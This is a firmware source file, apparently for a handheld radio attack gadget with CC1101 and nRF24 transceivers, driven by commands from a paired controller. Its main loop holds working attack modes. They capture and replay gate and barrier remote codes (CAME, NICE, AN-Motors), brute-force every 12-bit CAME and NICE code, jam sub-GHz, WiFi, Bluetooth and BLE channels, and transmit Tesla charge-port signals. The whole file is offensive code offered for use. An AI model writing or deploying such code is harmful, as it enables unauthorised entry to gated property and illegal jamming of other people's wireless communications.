#include "functions.h"

void setup()
{
  Serial.begin(115200);
  Serial.printf("Starting %s %s\n", APP_NAME, APP_VERSION);

  pinMode(LED_BUILTIN, OUTPUT);

  SPI.setSCK(6);
  SPI.setMOSI(7);
  SPI.setMISO(4);
  SPI.begin();

  analogReadResolution(12);
  batVoltage = readBatteryVoltage();
  EEPROM.begin(512);

  if (radio_RF24.begin())
  {
    Serial.println("RF24 initialized successfully");
  }
  else
  {
    Serial.println("RF24 initialization failed");
    while (1)
    {
    }
  }
  radio_RF24.powerDown();

  cc1101Init();
  if (ELECHOUSE_cc1101.getCC1101())
  {
    Serial.println("CC1101 initialized successfully");
  }
  else
  {
    Serial.println("CC1101 initialization failed");
    while (1)
    {
    }
  }

  communication.setRadioNRF24();
  communication.setSlaveMode();
  communication.init();

  Serial.printf("Current mode: %d\n", currentMode);
}

void setup1()
{
}

// Loop for common tasks
void loop()
{
  static uint32_t now = millis();

  switch (currentMode)
  {
  case IDLE:
  {
    if (!initializedIdle)
    {
      Serial.println("Initializing Idle mode...");
      communication.setRadioNRF24();
      communication.setSlaveMode();
      ELECHOUSE_cc1101.goSleep();
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      detachInterrupt(GD0_PIN_CC);
      digitalWrite(GD0_PIN_CC, LOW);
      stopRadioAttack();
      initializedIdle = true;
      initialized = false;
    }
    break;
  }
  case HF_SPECTRUM:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Spectrum mode...");
      cc1101ReadyMode();
      initialized = true;
    }

    break;
  }
  case HF_ACTIVITY:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Activity mode...");
      cc1101ReadyMode();
      initialized = true;
    }

    break;
  }
  case HF_BARRIER_SCAN:
  {
    static float radioFrequency = raFrequencies[1];

    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Scan mode...");
      cc1101ReadyMode();
      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
      initialized = true;
    }

    if (anMotorsCaptured || cameCaptured || niceCaptured)
    {
      anMotorsCaptured = false;
      niceCaptured = false;
      cameCaptured = false;

      // Repeating the signal
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      if (barrierProtocol == 0)
      {
        sendANMotors(barrierCodeMain, barrierCodeAdd);
      }
      else if (barrierProtocol == 1)
      {
        sendNice(barrierCodeMain);
      }
      else if (barrierProtocol == 2)
      {
        sendCame(barrierCodeMain);
      }

      initialized = false;
    }

    break;
  }
  case HF_BARRIER_REPLAY:
  {
    static float radioFrequency = raFrequencies[1];
    static bool attackIsActive = false;
    static uint32_t attackTimer = now;

    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Replay mode...");
      cc1101ReadyMode();
      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
      initialized = true;
    }

    if (anMotorsCaptured || cameCaptured || niceCaptured)
    {
      anMotorsCaptured = false;
      niceCaptured = false;
      cameCaptured = false;

      // Repeating the signal
      pinMode(GD0_PIN_CC, OUTPUT);
      detachInterrupt(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      attackIsActive = true;
    }

    if (attackIsActive && now - attackTimer >= 1000)
    {
      if (barrierProtocol == 0)
      {
        sendANMotors(barrierCodeMain, barrierCodeAdd);
      }
      else if (barrierProtocol == 1)
      {
        sendNice(barrierCodeMain);
      }
      else if (barrierProtocol == 2)
      {
        sendCame(barrierCodeMain);
      }
      attackTimer = now;
    }

    break;
  }
  case HF_BARRIER_BRUTE_CAME:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Brute CAME mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      initialized = true;
    }

    static int16_t barrierBruteIndex = 4095;
    static uint32_t lastSendTime = now;

    if (now - lastSendTime > 50)
    {
      lastSendTime = now;

      if (barrierBruteIndex >= 0)
      {
        sendCame(barrierBruteIndex);
        barrierBruteIndex--;
      }
      if (barrierBruteIndex < 0)
      {
        barrierBruteIndex = 4095;
        currentMode = IDLE;
      }
    }

    break;
  }
  case HF_BARRIER_BRUTE_NICE:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Barrier Brute NICE mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      initialized = true;
    }

    static int16_t barrierBruteIndex = 4095;
    static uint32_t lastSendTime = now;

    if (now - lastSendTime > 50)
    {
      lastSendTime = now;

      if (barrierBruteIndex >= 0)
      {
        sendNice(barrierBruteIndex);
        barrierBruteIndex--;
      }
      if (barrierBruteIndex < 0)
      {
        barrierBruteIndex = 4095;
        currentMode = IDLE;
      }
    }

    break;
  }
  case HF_SCAN:
  {
    static float radioFrequency = raFrequencies[1];

    if (!initialized)
    {
      Serial.println("Initializing HF Scan mode...");
      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableTransmit();
      mySwitch.enableReceive(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      mySwitch.resetAvailable();
      initialized = true;
    }

    if (mySwitch.available())
    {
      // Check if the signal is valid
      if (mySwitch.getReceivedBitlength() < 10)
      {
        mySwitch.resetAvailable();
        break;
      }

      mySwitch.resetAvailable();

      // Reapiting the signal
      mySwitch.disableReceive();
      mySwitch.enableTransmit(GD0_PIN_CC);
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
      mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
      initialized = false;
    }

    break;
  }
  case HF_REPLAY:
  {
    static float radioFrequency = raFrequencies[1];
    static bool attackIsActive = false;
    static uint32_t attackTimer = now;

    if (!initialized)
    {
      Serial.println("Initializing HF Replay mode...");
      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, INPUT);
      mySwitch.disableTransmit();
      mySwitch.enableReceive(GD0_PIN_CC);
      ELECHOUSE_cc1101.SetRx(radioFrequency);
      mySwitch.resetAvailable();
      initialized = true;
    }

    if (mySwitch.available())
    {
      // Check if the signal is valid
      if (mySwitch.getReceivedBitlength() < 10)
      {
        mySwitch.resetAvailable();
        break;
      }

      mySwitch.resetAvailable();

      // Reapiting the signal
      mySwitch.disableReceive();
      mySwitch.enableTransmit(GD0_PIN_CC);
      pinMode(GD0_PIN_CC, OUTPUT);
      ELECHOUSE_cc1101.SetTx(radioFrequency);

      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
      attackIsActive = true;
    }

    if (attackIsActive && now - attackTimer >= 1000)
    {
      mySwitch.send(capturedCode, capturedLength);
      attackTimer = now;
    }

    break;
  }
  case HF_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Jammer mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      initialized = true;
    }

    static uint32_t lastNoise = 0;
    static bool noiseState = false;
    uint32_t nowMicros = micros();

    // changeFreqButtons("TX");

    if (nowMicros - lastNoise > 500)
    {
      noiseState = !noiseState;
      digitalWrite(GD0_PIN_CC, noiseState);
      lastNoise = nowMicros;
    }

    break;
  }
  case HF_TESLA:
  {
    if (!initialized)
    {
      Serial.println("Initializing HF Tesla mode...");
      cc1101ReadyMode();
      pinMode(GD0_PIN_CC, OUTPUT);
      mySwitch.disableReceive();
      mySwitch.disableTransmit();
      ELECHOUSE_cc1101.SetTx(raFrequencies[1]);
      initialized = true;
    }

    static bool toggleFreq = false;
    float freq = toggleFreq ? 315.0 : 433.92;
    ELECHOUSE_cc1101.SetTx(freq);
    toggleFreq = !toggleFreq;

    sendTeslaSignal_v1();
    delay(50);
    sendTeslaSignal_v2();
    delay(50);

    break;
  }

  // Handle UHF modes
  case UHF_SPECTRUM:
  {
    break;
  }
  case UHF_ALL_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF All Jammer mode...");
      initRadioAttack();
      initialized = true;
    }
    radioChannel = random(0, 125);
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_WIFI_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF WiFi Jammer mode...");
      initRadioAttack();
      initialized = true;
    }
    radioChannel = random(1, 15);
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_BT_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF Bluetooth Jammer mode...");
      initRadioAttack();
      initialized = true;
    }
    int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
    radioChannel = bluetooth_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  case UHF_BLE_JAMMER:
  {
    if (!initialized)
    {
      Serial.println("Initializing UHF BLE Jammer mode...");
      initRadioAttack();
      initialized = true;
    }
    int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
    radioChannel = ble_channels[randomIndex];
    radio_RF24.setChannel(radioChannel);
    break;
  }
  }
}

// Loop for communication tasks
void loop1()
{
  static uint32_t now = millis();

  if (!succsessfulConnection)
  {
    if (communication.checkConnection(1000))
    {
      Serial.println("Connection established");
      succsessfulConnection = true;
    }
    else
    {
      Serial.println("Connection failed");
    }

    Serial.printf("Current mode: %d\n", currentMode);
  }

  if (succsessfulConnection && communication.getCurrentMode() == Slave && communication.receivePacket(recievedData, &recievedDataLen))
  {
    currentMode = getModeFromPacket(recievedData, recievedDataLen);
    Serial.printf("Current mode: %d\n", currentMode);
    initializedIdle = false;
    Serial.printf("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
    switch (currentMode)
    {
    case UHF_SPECTRUM:
    case UHF_ALL_JAMMER:
    case UHF_WIFI_JAMMER:
    case UHF_BT_JAMMER:
    case UHF_BLE_JAMMER:
      communication.setRadioCC1101();
      communication.setSlaveMode();
      communication.init();
      break;

    default:
      communication.setRadioNRF24();
      communication.setSlaveMode();
      communication.init();
      break;
    }
  }

  if (now - batteryTimer >= BATTERY_CHECK_INTERVAL)
  {
    uint8_t batteryVoltagePacket[3];

    batteryTimer = millis();
    batVoltage = readBatteryVoltage();
    Serial.printf("Battery voltage: %.2fV\n", batVoltage);
    communication.buildPacket(COMMAND_BATTERY_VOLTAGE, (uint8_t *)&batVoltage, 1, batteryVoltagePacket);
    communication.sendPacket(batteryVoltagePacket, 3);
  }
}
